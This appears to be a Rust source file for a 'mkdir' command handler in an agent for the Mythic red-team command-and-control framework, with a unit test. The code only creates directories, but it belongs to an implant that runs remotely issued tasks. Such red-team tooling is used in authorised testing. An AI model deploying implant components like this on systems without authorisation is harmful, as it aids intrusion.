//! Create a directory — cross-platform via std::fs::create_dir_all.
//!
use std::path::Path;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::common::pathguard::{display_path, normalize_user_path};

#[derive(Deserialize)]
struct Params {
    path: String,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("mkdir parse error: {e}")),
    };

    let path_str = normalize_user_path(&params.path);
    let path = Path::new(&path_str);
    match std::fs::create_dir_all(path) {
        Ok(_) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(format!("created directory {}", display_path(path))),
            ..Default::default()
        },
        Err(e) => TaskResponse::failed(
            task.id,
            &format!("mkdir {} failed: {e}", display_path(path)),
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn unique_tmp(label: &str) -> std::path::PathBuf {
        static COUNTER: AtomicUsize = AtomicUsize::new(0);
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        let mut p = std::env::temp_dir();
        p.push(format!("nanaz-mkdir-test-{label}-{pid}-{n}"));
        std::fs::create_dir_all(&p).expect("create temp dir");
        p
    }

    #[test]
    fn test_mkdir_creates_dir() {
        let dir = unique_tmp("root");
        let new = dir.join("a/b/c");
        let task = TaskMessage {
            command: "mkdir".into(),
            parameters: serde_json::json!({ "path": new.to_string_lossy() }).to_string(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("completed"));
        assert!(new.is_dir(), "expected {} to be a dir", new.display());
        let _ = std::fs::remove_dir_all(&dir);
    }
}
